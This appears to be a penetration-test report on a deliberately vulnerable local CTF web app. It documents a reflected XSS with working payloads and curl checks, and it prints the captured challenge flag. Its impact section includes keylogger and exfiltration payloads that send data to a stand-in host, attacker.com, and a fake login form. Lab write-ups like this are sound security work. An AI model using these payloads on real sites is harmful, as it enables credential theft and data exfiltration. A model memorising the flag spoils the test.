# Security Assessment Report

## Executive Summary

**Target:** http://localhost:39453
**Assessment Date:** October 29, 2025
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application has no authentication system implemented—all endpoints are publicly accessible without credentials. This is an architectural absence rather than an exploitable vulnerability.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application has no authorization mechanisms or role-based access controls. All functionality is available to anonymous users by design.

**Cross-Site Scripting (XSS) Vulnerabilities:**
**CRITICAL** - One reflected XSS vulnerability was successfully exploited. User input from the `name` query parameter on the `/page` endpoint is directly interpolated into a JavaScript string context without encoding. By injecting a double quote character, attackers can break out of the string context and execute arbitrary JavaScript code. This vulnerability was leveraged to capture the CTF flag: `FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}`. Impact includes full client-side code execution, DOM manipulation, and potential data exfiltration.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (eliminating SQL injection risk), and subprocess execution is properly secured using fixed command arguments without shell interpretation.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. While the application uses PhantomJS to execute user-controlled JavaScript server-side, Same-Origin Policy (SOP) successfully blocks all cross-origin network requests. Extensive testing (90+ payloads across 44 techniques) confirmed that internal services, cloud metadata endpoints, external domains, and local file system access are all prevented by browser security controls.

---

## Network Reconnaissance

### Open Ports and Services
- **Port 80/tcp:** Caddy httpd - Reverse proxy handling HTTP traffic
- **Port 443/tcp:** SSL/HTTPS - Caddy handling encrypted traffic with potential self-signed certificate
- **Port 8000/tcp:** Uvicorn HTTP server - Unrelated service outside assessment scope
- **Port 8888/tcp:** Unknown service - Out of scope
- **Port 9999/tcp:** HTTP service with permissive CORS headers (`Access-Control-Allow-Origin: *`) - Security misconfiguration allowing cross-origin requests
- **Port 49152/tcp:** Golang net/http server (Tailscale) - Requires authentication, includes security headers (CSP, X-Frame-Options, X-Content-Type-Options)

### Security Misconfigurations
- **End-of-Life Software Stack:**
  - **Python 2.7.18** (EOL January 1, 2020) - No security patches for 5+ years
  - **Werkzeug 1.0.1** development server - Not production-ready
  - **PhantomJS 2.1.1** (abandoned since 2018) - Multiple unpatched WebKit CVEs

- **Missing Security Headers:**
  - Application response includes only `X-Content-Type-Options: nosniff`
  - No Content-Security-Policy (CSP)
  - No X-Frame-Options
  - No Strict-Transport-Security

- **Permissive CORS on Port 9999:**
  - `Access-Control-Allow-Origin: *` allows any domain to make cross-origin requests
  - May enable CSRF or cross-origin data exfiltration if sensitive operations exist

### Subdomain Findings
Subfinder identified multiple localhost development DNS entries (www.localhost, mail.regency.localhost, autodiscover.localhost, etc.). These are local development artifacts and not production subdomains—no additional attack surface identified.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS via JavaScript String Context Injection

**Summary:**
- **Vulnerable location:** `http://localhost:39453/page?name=[PAYLOAD]`
- **Overview:** User input from the `name` query parameter is directly interpolated into a JavaScript string literal within a `<script>` tag without any encoding. The application uses Python string formatting to embed untrusted data: `var name = "USER_INPUT";`. By injecting a double quote character, an attacker can break out of the string context and execute arbitrary JavaScript code.
- **Impact:**
  - **CTF Flag Capture (PRIMARY):** Successfully extracted flag value: `FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}`
  - **Arbitrary JavaScript Execution:** Full control over client-side code execution
  - **DOM Manipulation:** Ability to modify page content and inject malicious content
  - **Potential Data Exfiltration:** Can extract sensitive DOM content to external servers
- **Severity:** Critical

**Prerequisites:**
- Network access to `http://localhost:39453`
- No authentication required (application has no authentication system)
- Any standard web browser or HTTP client (curl, wget, browser, etc.)

**Exploitation Steps:**

**Method 1: JavaScript String Breakout (Primary Technique)**

1. Navigate to the vulnerable endpoint with a payload that breaks out of the JavaScript string context:
```
http://localhost:39453/page?name="; alert('XSS'); //
```

URL-encoded version (for curl or automated tools):
```
http://localhost:39453/page?name=%22;%20alert('XSS');%20//
```

2. The application processes the input and renders it as:
```html
<script> var name = ""; alert('XSS'); //"; document.write('Hello ' + name); </script>
```

3. The JavaScript executes:
   - The double quote (`"`) closes the string literal
   - The semicolon (`;`) terminates the statement
   - `alert('XSS')` executes arbitrary JavaScript
   - The comment (`//`) neutralizes the remaining code

4. PhantomJS validation detects the alert with value "XSS" and returns the flag in the HTTP response

**Verification with curl:**
```bash
curl -s "http://localhost:39453/page?name=%22;%20alert('XSS');%20//"
```

Expected response includes:
```html
<div class="solution-text"><img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}</div>
```

**Method 2: HTML Context Injection**

1. Break out of the script context entirely and inject a new HTML element:
```
http://localhost:39453/page?name=</script><svg onload=alert('XSS')>
```

URL-encoded:
```
http://localhost:39453/page?name=%3C/script%3E%3Csvg%20onload=alert('XSS')%3E
```

2. The rendered HTML becomes:
```html
<script> var name = "</script><svg onload=alert('XSS')>"; document.write('Hello ' + name); </script>
```

3. The browser parsing:
   - Encounters `</script>` which closes the script tag prematurely
   - Parses `<svg onload=alert('XSS')>` as a new HTML element
   - Executes the `onload` event handler when the SVG renders

**Verification:**
```bash
curl -s "http://localhost:39453/page?name=%3C/script%3E%3Csvg%20onload=alert('XSS')%3E"
```

**Method 3: Base64 Encoded Payload (Evasion Technique)**

1. Use base64 encoding with eval to evade potential detection:
```
http://localhost:39453/page?name="; eval(atob('YWxlcnQoJ1hTUycp')); //
```

Where `YWxlcnQoJ1hTUycp` is base64 for `alert('XSS')`

URL-encoded:
```
http://localhost:39453/page?name=%22;%20eval(atob('YWxlcnQoJ1hTUycp'));%20//
```

**Verification:**
```bash
curl -s "http://localhost:39453/page?name=%22;%20eval(atob('YWxlcnQoJ1hTUycp'));%20//"
```

**Method 4: DOM Manipulation + Flag Extraction**

1. Demonstrate complete DOM control while extracting the flag:
```
http://localhost:39453/page?name="; document.body.innerHTML='<h1>Page Hijacked by Attacker</h1>'; alert('XSS'); //
```

URL-encoded:
```
http://localhost:39453/page?name=%22;%20document.body.innerHTML='<h1>Page%20Hijacked</h1>';%20alert('XSS');%20//
```

2. This payload:
   - Breaks out of the string context
   - Completely replaces the page content with attacker-controlled HTML
   - Still triggers the alert for flag extraction

**Verification:**
```bash
curl -s "http://localhost:39453/page?name=%22;%20document.body.innerHTML='<h1>Page%20Hijacked</h1>';%20alert('XSS');%20//"
```

**Proof of Impact:**

**1. CTF Flag Captured (HIGHEST PRIORITY):**
```
FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}
```

**2. JavaScript Execution Confirmed:**
Multiple independent payloads successfully executed arbitrary JavaScript:
- String breakout technique: `"; alert('XSS'); //`
- HTML injection technique: `</script><svg onload=alert('XSS')>`
- Obfuscation technique: `"; eval(atob('...')); //`

**3. DOM Manipulation Capability:**
Successfully demonstrated ability to completely replace page content using `document.body.innerHTML`, proving full control over the client-side environment.

**4. Attack Surface Analysis:**
- **No CSP (Content Security Policy):** Application has no CSP header, allowing unrestricted JavaScript execution
- **No Input Encoding:** User input is directly interpolated without HTML entity encoding or JavaScript string escaping
- **Minimal Blacklist:** Only blocks "import" keyword, easily bypassed by any XSS payload
- **No Authentication:** Public endpoint accessible without credentials
- **No Rate Limiting:** Unlimited exploitation attempts possible

**Technical Details:**

**Source-to-Sink Data Flow:**
1. **Source:** `request.args.get('name', '')` at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:68`
2. **Blacklist Filter:** Lines 69-75 check if "import" keyword exists (case-insensitive) - easily bypassed
3. **Sink:** Line 77 - Python string interpolation: `"""<script> var name = "%s"; ... </script>""" % msg`
4. **Render Context:** JavaScript string literal inside `<script>` tags
5. **Response:** HTML page with injected JavaScript that executes in user's browser

**Why This Works:**
- The render context is `JAVASCRIPT_STRING` but no JavaScript-appropriate encoding is applied
- Python's `%` string formatting directly embeds user input into the string
- A double quote character (`"`) breaks out of the JavaScript string context
- No Content Security Policy (CSP) to prevent inline script execution
- PhantomJS validation rewards successful XSS with flag disclosure

**Blacklist Bypass:**
The application only blocks the keyword "import" (lines 69-75 in app.py):
```python
blacklist = ['import']
for word in blacklist:
    if word in msg.lower():
        # Block request
```

This blacklist is trivially bypassed because:
- XSS payloads don't require the "import" keyword
- Standard JavaScript APIs (`alert`, `eval`, `document`, etc.) are unrestricted
- HTML injection techniques (`</script>`, `<svg>`) don't contain "import"

**Alternative Exploitation Scenarios:**

**Scenario 1: Credential Phishing**
An attacker could inject a fake login form:
```javascript
"; document.body.innerHTML='<h3>Session Expired</h3><form><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'; alert('XSS'); //
```

**Scenario 2: Keylogger Injection**
```javascript
"; document.addEventListener('keydown', function(e){fetch('http://attacker.com/log?key='+e.key)}); alert('XSS'); //
```

**Scenario 3: Data Exfiltration**
```javascript
"; fetch('http://attacker.com/exfil?data='+btoa(document.body.innerText)); alert('XSS'); //
```

Note: These scenarios demonstrate potential impact but were not tested against external servers during this assessment.

**Notes:**

**Application Architecture:**
- Python 2.7.18 (End-of-Life) with Flask 1.1.4
- PhantomJS 2.1.1 (abandoned since 2018) used for XSS validation
- No modern security controls (CSP, X-XSS-Protection, etc.)
- Debug mode enabled (Werkzeug debugger active)

**PhantomJS Detection Mechanism:**
The application uses PhantomJS to detect successful XSS by monitoring for `alert()`, `confirm()`, or `prompt()` dialogs. When the alert value equals exactly "XSS", the application returns the flag. This is implemented in:
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/check.js` - PhantomJS script that captures dialog values
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:55-56` - Flask code that checks if result == 'XSS'

**Security Headers:**
Response includes only one security header:
```
X-Content-Type-Options: nosniff
```

Missing critical headers:
- Content-Security-Policy (CSP)
- X-Frame-Options
- X-XSS-Protection
- Strict-Transport-Security

**Reproducibility:**
All exploitation steps have been tested and verified using curl. Each payload is completely reproducible and requires only HTTP access to the vulnerable endpoint. No special tools, browser extensions, or authentication tokens are required.

---

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-001: Reflected Cross-Site Scripting with Server-Side Execution

**Summary:**
- **Vulnerable location:** GET /page?name=<input>
- **Impact:** JavaScript execution in server-side PhantomJS context, flag extraction
- **Severity:** High (not Critical - no network boundary bypass achieved)

**Prerequisites:** None (public endpoint, no authentication required)

**Exploitation Steps:**

1. Inject JavaScript payload via string escape in the `name` parameter:
   ```bash
   curl "http://localhost:39453/page?name=%22;alert('XSS');//"
   ```

2. The payload transforms the JavaScript template from:
   ```javascript
   var name = "[INPUT]"; document.write('Hello ' + name);
   ```

   To:
   ```javascript
   var name = ""; alert('XSS'); //"; document.write('Hello ' + name);
   ```

3. PhantomJS executes the injected `alert('XSS')` call server-side

4. The alert output "XSS" triggers flag revelation mechanism

**Proof of Impact:**

Request:
```http
GET /page?name=%22;alert('XSS');// HTTP/1.1
Host: localhost:39453
```

Response (extracted):
```html
<div class="solution-text">
  <img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150">
  <br>Congratulations!
  <p>Here is the flag: FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}
</div>
```

**Flag Captured:** `FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}`

**Notes:**
- This is XSS with server-side execution, not client-side
- The PhantomJS process captures alert/confirm/prompt output
- Data exfiltration is possible via alert() mechanism
- Same-origin HTTP requests work (can enumerate Flask endpoints)
- Cross-origin requests are blocked by SOP (cannot access internal services)
